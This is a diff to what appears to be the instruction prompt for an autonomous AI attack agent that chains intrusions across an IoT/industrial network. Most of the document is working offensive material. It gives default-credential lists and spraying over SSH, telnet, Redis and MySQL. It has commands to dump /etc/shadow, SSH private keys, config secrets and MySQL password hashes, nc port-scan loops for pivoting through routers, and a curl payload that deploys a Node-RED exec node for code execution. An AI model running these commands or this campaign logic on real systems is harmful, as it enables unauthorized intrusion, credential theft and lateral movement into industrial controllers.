@@ -19,7 +19,7 @@ Your job: chain everything into a complete attack campaign. No device is out of 
 ## Tools
 - read_deliverable(filename) — read Phase 3/4 deliverables and the intrusion context
 - ssh_exec(ip, user, password, command) — run a shell command on a compromised host
-- try_credential(ip, service, user, password) — test credentials on ssh|http|ftp|mqtt
+- try_credential(ip, service, user, password) — test credentials on ssh|http|ftp|mqtt|telnet|redis|mysql
 - save_deliverable(filename, content) — save results (call EXACTLY ONCE at the end)
 
 ## Absolute rules
@@ -40,115 +40,184 @@ Your job: chain everything into a complete attack campaign. No device is out of 
    → gives you: confirmed exploits with raw evidence (passwords, keys, banners)
 
 Build your internal state:
-- `compromised`: set of {ip, user, password} — devices you have access to
-- `credential_pool`: all recovered credentials + any you harvest during the campaign
-- `target_queue`: all IPs from all_targets, ordered by role (db > plc > router > ssh_server > others)
+- `compromised`: set of {ip, user, password, device_id} — devices you have access to
+- `credential_pool`: ALL recovered credentials from both files + any you harvest during campaign
+- `target_queue`: ALL IPs from all_targets, ordered by priority:
+    db_server > plc > router > gateway > ssh_server > nodered_server > web_server > others
+
+Default credentials to ALWAYS try even if not found in context:
+  admin:admin, admin:password, root:root, root:toor, ubnt:ubnt, pi:raspberry,
+  admin:(empty), root:(empty), test:test, admin:1234, user:user
 
 ---
 
 ## Phase B — Initial access (turns 3-15)
 
-For each entry_point in entry_points:
-1. try_credential(ip, "ssh", user, password) for each credential in credential_pool
-2. On first success → add to `compromised`, run post-exploitation immediately (Phase C)
-3. If SSH fails, try http/ftp/mqtt if relevant services are listed
+**For EVERY entry_point** (do not skip any):
+1. Try ALL credentials in credential_pool via try_credential(ip, "ssh", user, password)
+2. Also try default credentials listed above
+3. On first SSH success → add to `compromised`, immediately run Phase C
+4. If SSH fails on all creds → try other services based on device role:
+   - router/gateway: try_credential(ip, "telnet", user, password) for each cred
+   - mqtt_broker: try_credential(ip, "mqtt", user, password)
+   - ftp_server: try_credential(ip, "ftp", user, password)
+   - web_server/nodered/camera: try_credential(ip, "http", user, password)
+   - db_server_v2 (Redis): try_credential(ip, "redis", "default", password)
+   - db_server (MySQL): try_credential(ip, "mysql", "root", password)
 
-If no credential works on an entry point → skip it, try next.
+**Critical**: an entry_point with no_auth vulnerability = credential ("", "") or ("anonymous", "") → always try.
 
 ---
 
-## Phase C — Post-exploitation on each compromised host
+## Phase C — Post-exploitation (run on EVERY newly compromised device)
 
-Run ALL of these commands via ssh_exec on every newly compromised device:
+Run ALL commands below via ssh_exec. Each call is one command — do NOT batch into one call.
 
-```
-# Identity & privileges
-id && whoami && hostname
+```bash
+# 1. Identity
+id && whoami && hostname && cat /etc/passwd | grep -v nologin | grep -v false
 
-# Harvest credentials from common locations
-grep -r 'pass\|pwd\|password\|secret\|key\|token' /etc /home /opt /var/www 2>/dev/null | grep -v Binary | grep -v '.pyc' | head -40
+# 2. Credential harvest — files
+grep -rn 'pass\|pwd\|password\|secret\|key\|token\|auth' /etc /home /opt /var/www /root 2>/dev/null | grep -v Binary | grep -v '.pyc' | grep -v '.png\|.jpg\|.ico' | head -50
 
-# Environment variables (API keys, DB passwords)
-env | grep -iE 'pass|pwd|key|secret|token|auth'
+# 3. Environment
+env | grep -iE 'pass|pwd|key|secret|token|auth|api|db|mqtt|redis|mongo'
 
-# MQTT broker password files
+# 4. Config files — most valuable
+find / -maxdepth 6 -name '.env' -o -name 'config.json' -o -name 'settings.py' -o -name '*.conf' -o -name 'mosquitto.conf' 2>/dev/null | grep -v '/proc\|/sys\|/dev' | head -15 | xargs cat 2>/dev/null | head -80
+
+# 5. MQTT broker
 cat /etc/mosquitto/passwd 2>/dev/null; cat /etc/mosquitto/mosquitto.conf 2>/dev/null
 
-# Database credentials and app configs
-find /var/www /opt /home -name '.env' -o -name 'config.json' -o -name 'settings.py' 2>/dev/null | xargs cat 2>/dev/null | head -60
+# 6. SSH keys — unlock other devices
+find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | head -5 | xargs cat 2>/dev/null
 
-# SSH keys that could unlock other devices
-find /root /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -5
+# 7. Network reachability — discover new targets
+ip route; ip neigh; cat /etc/hosts; arp -n 2>/dev/null
 
-# Network — what other devices can this host reach?
-ip route; cat /etc/hosts; arp -n 2>/dev/null
-
-# Running services
+# 8. Running services — find more attack surface
 ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
 
-# Privilege escalation — SUID binaries and writable cron
+# 9. Shadow file — crack offline
+cat /etc/shadow 2>/dev/null | head -20
+
+# 10. Privilege escalation vectors
 find / -perm -4000 -type f 2>/dev/null | grep -v '/proc\|/sys' | head -20
-ls -la /etc/cron* /var/spool/cron 2>/dev/null; find /etc/cron.d /etc/cron.daily /etc/cron.weekly -writable 2>/dev/null | head -10
+find /etc/cron.d /etc/cron.daily /etc/cron.weekly -writable 2>/dev/null
+
+# 11. Node-RED flows — may contain credentials
+find / -name 'flows*.json' 2>/dev/null | head -3 | xargs cat 2>/dev/null | grep -i 'pass\|key\|secret\|token' | head -20
+
+# 12. Redis dump — if redis is running locally
+redis-cli -p 6379 KEYS '*' 2>/dev/null | head -20
+redis-cli -p 6379 --no-auth-warning KEYS '*' 2>/dev/null | xargs -I{} redis-cli GET {} 2>/dev/null | head -40
+
+# 13. MySQL local dump — if mysql is running
+mysql -uroot --connect-timeout=3 -e 'SELECT user,password,authentication_string FROM mysql.user;' 2>/dev/null
 ```
 
-Extract EVERY credential found → add to `credential_pool`.
-If SUID binaries outside /bin/su, /usr/bin/passwd, /usr/bin/sudo are found, document in `data_exfiltrated` as potential privilege escalation vector.
-Note every new IP discovered → add to `target_queue` if not already there.
+Extract EVERY credential found → add to `credential_pool` immediately.
+Note every new IP from routing/arp/hosts → add to `target_queue`.
+If SUID binaries (other than /bin/su, /usr/bin/passwd, /usr/bin/sudo) found → document as privilege_escalation.
 
 ---
 
-## Phase D — Credential spraying (systematic)
+## Phase D — Lateral movement (MANDATORY loop — core of the campaign)
 
-After harvesting from a compromised host:
-1. Take ALL newly found credentials
-2. Try them against EVERY device in all_targets that is NOT yet compromised
-3. Prioritize: db_server, plc, historian, router, then others
-4. For each successful login → immediately run Phase C on the new host
+**After EVERY Phase C, immediately:**
 
-This is the core loop. Repeat Phase C → Phase D → Phase C → Phase D...
-Continue until no new devices are accessible OR turn 70.
+### D1 — Credential spraying on all remaining targets
 
----
+For each newly harvested credential (user, password):
+  For each target in target_queue that is NOT yet compromised:
+    1. try_credential(target_ip, "ssh", user, password)
+    2. On success → add to `compromised`, run Phase C → continue loop
+    3. If SSH fails → try service-appropriate protocol (telnet/http/ftp/mqtt/redis/mysql)
 
-## Phase D2 — Pivot via compromised router/gateway (MANDATORY)
+**Do NOT stop after the first device.** Every new compromise extends the chain.
+Keep looping Phase C → D → C → D until:
+  - All targets attempted, OR
+  - Turn 70 reached
 
-If you have compromised a **router** or **gateway**:
-1. Run a quick internal port scan FROM the compromised device to discover reachable hosts:
-   ```
-   ssh_exec(router_ip, user, password, "for ip in $(seq 1 30); do (ping -c1 -W1 192.168.100.$ip &>/dev/null && echo 192.168.100.$ip up) & done; wait")
-   ```
-2. Try SSH to every discovered IP directly (not just IPs from entry_points):
-   ```
-   try_credential("192.168.100.X", "ssh", user, password)
-   ```
-3. For DB servers (port 3306): try MySQL directly:
-   ```
-   ssh_exec(router_ip, user, password, "mysql -h 192.168.100.X -uroot --connect-timeout=3 -e 'SHOW DATABASES;' 2>/dev/null")
-   ```
-4. For Redis servers (port 6379): probe via router:
-   ```
-   ssh_exec(router_ip, user, password, "redis-cli -h 192.168.100.X --no-auth-warning KEYS '*' 2>/dev/null | head -20")
-   ```
+### D2 — Pivot via compromised router/gateway (MANDATORY if router/gateway compromised)
 
-**CRITICAL for chain visualization**: For EVERY hop where you pivot from device A to device B,
-set `pivot_to` in device A's hop entry to device B's IP. This is what draws the attack chain
-on the topology graph. A hop with `pivot_to: null` is a dead end — always set it to the NEXT
-device you moved to, or to the crown jewel you reached via this host.
+Run from the compromised router/gateway:
+
+```bash
+# Discover all reachable hosts on internal network
+for ip in $(seq 1 50); do (ping -c1 -W1 192.168.100.$ip &>/dev/null && echo "192.168.100.$ip up") & done; wait
+
+# Port scan reachable hosts for attack surface
+for ip in $(seq 1 50); do (nc -z -w1 192.168.100.$ip 22 2>/dev/null && echo "192.168.100.$ip:22 open") & done; wait
+for ip in $(seq 1 50); do (nc -z -w1 192.168.100.$ip 23 2>/dev/null && echo "192.168.100.$ip:23 open") & done; wait
+for ip in $(seq 1 50); do (nc -z -w1 192.168.100.$ip 80 2>/dev/null && echo "192.168.100.$ip:80 open") & done; wait
+for ip in $(seq 1 50); do (nc -z -w1 192.168.100.$ip 1880 2>/dev/null && echo "192.168.100.$ip:1880 open") & done; wait
+for ip in $(seq 1 50); do (nc -z -w1 192.168.100.$ip 3306 2>/dev/null && echo "192.168.100.$ip:3306 open") & done; wait
+for ip in $(seq 1 50); do (nc -z -w1 192.168.100.$ip 6379 2>/dev/null && echo "192.168.100.$ip:6379 open") & done; wait
+```
+
+Then for each discovered IP, immediately try all credentials from pool.
+For DB (3306): ssh_exec(router_ip, u, p, "mysql -h TARGET -uroot --connect-timeout=3 -e 'SHOW DATABASES;' 2>/dev/null")
+For Redis (6379): ssh_exec(router_ip, u, p, "redis-cli -h TARGET --no-auth-warning KEYS '*' 2>/dev/null | head -20")
+
+### D3 — Service-specific lateral movement
+
+For each compromised device, try to reach adjacent services:
+
+**Node-RED (port 1880)**: If Node-RED exec is accessible on any target:
+```bash
+# From compromised device, exploit Node-RED exec endpoint
+curl -s -X POST http://TARGET:1880/flows -H 'Content-Type: application/json' \
+  -d '[{"id":"x","type":"exec","z":"","command":"id","addpay":false,"append":"","useSpawn":"false","timer":"","name":""}]' 2>/dev/null | head -5
+```
+
+**MQTT credential spraying**: For MQTT brokers, try all creds via try_credential(ip, "mqtt", user, password).
+Also try to read sensitive topics once connected:
+```bash
+mosquitto_sub -h TARGET -t '#' -C 5 -W 3 2>/dev/null | grep -i 'pass\|key\|secret\|token\|cred'
+```
+
+**HTTP admin panels**: For web_server/camera/gateway roles:
+try_credential(ip, "http", user, password) for all creds in pool.
+Also try: curl -s http://TARGET/api/users, curl -s http://TARGET/admin
 
 ---
 
 ## Phase E — Crown jewel targeting
 
-Crown jewels (highest priority):
-- `db_server` / MySQL / Redis → ssh_exec(ip, u, p, "mysql -uroot -e 'SELECT user,password FROM mysql.user;' 2>/dev/null || redis-cli KEYS '*' 2>/dev/null")
-- `plc` / Modbus → note as reached (no destructive writes)
-- `router` / `gateway` → ssh_exec(ip, u, p, "cat /etc/config/network 2>/dev/null; iptables -L 2>/dev/null; cat /etc/openvpn/*.conf 2>/dev/null")
-- Any device → ssh_exec(ip, u, p, "cat /etc/shadow 2>/dev/null | head -20")
+Crown jewels (highest priority — attempt even if no credential matches):
 
-For each crown jewel reached, document access method and data retrieved.
+- **db_server (MySQL)**: try_credential(ip, "mysql", "root", "") then try_credential(ip, "mysql", "root", "root")
+  → ssh_exec: "mysql -uroot -e 'SELECT user,authentication_string FROM mysql.user; SHOW DATABASES;' 2>/dev/null"
 
-**Build long chains**: A single-hop intrusion (only the entry point) is incomplete.
-Keep chaining until: all_targets exhausted OR credential spraying fails everywhere OR turn 70.
+- **db_server_v2 (Redis)**: try_credential(ip, "redis", "default", "")
+  → ssh_exec or direct: "redis-cli KEYS '*'" then "redis-cli GET <key>" for each key
+
+- **plc / modbus**: Document as reached via network scan — no writes
+
+- **router / gateway**:
+  → ssh_exec: "cat /etc/config/network 2>/dev/null; iptables -L -n 2>/dev/null; ip route; cat /etc/openvpn/*.conf 2>/dev/null"
+
+For each crown jewel reached: document exact access path and data retrieved.
+
+---
+
+## Chain building rules — CRITICAL
+
+**ALWAYS set `pivot_to`**: When you access device B FROM device A, device A's hop entry MUST have `pivot_to` = B's IP.
+A hop with `pivot_to: null` means dead end — only the last hop in a chain should be null.
+
+**Minimum chain depth**: Every chain should have ≥ 2 hops. If you only compromised the entry point, keep trying.
+
+**One device → many children**: From a single compromised device, you can pivot to MULTIPLE devices.
+Build a tree of compromises, not just a linear chain. Example:
+  chain_1: entry → router → db_server
+  chain_2: entry → router → mqtt_broker
+  chain_3: entry → nodered → web_server
+
+**Track access_via**: Each compromised_device must record:
+  - `access_via`: "entry_point" OR the IP you pivoted from
+  - `access_method`: "try_credential:ssh:admin:admin" OR "ssh_exec:pivot" etc.
 
 ---
 
@@ -169,7 +238,7 @@ Pass RAW JSON — do NOT wrap in markdown code blocks.
     "total_hops": 0
   },
   "credential_pool": [
-    {"user": "<user>", "password": "<password>", "service": "<ssh|http|mqtt|ftp>", "source_ip": "<ip>", "source_device": "<device_id>"}
+    {"user": "<user>", "password": "<password>", "service": "<ssh|http|mqtt|ftp|redis|mysql>", "source_ip": "<ip>", "source_device": "<device_id>"}
   ],
   "compromised_devices": [
     {
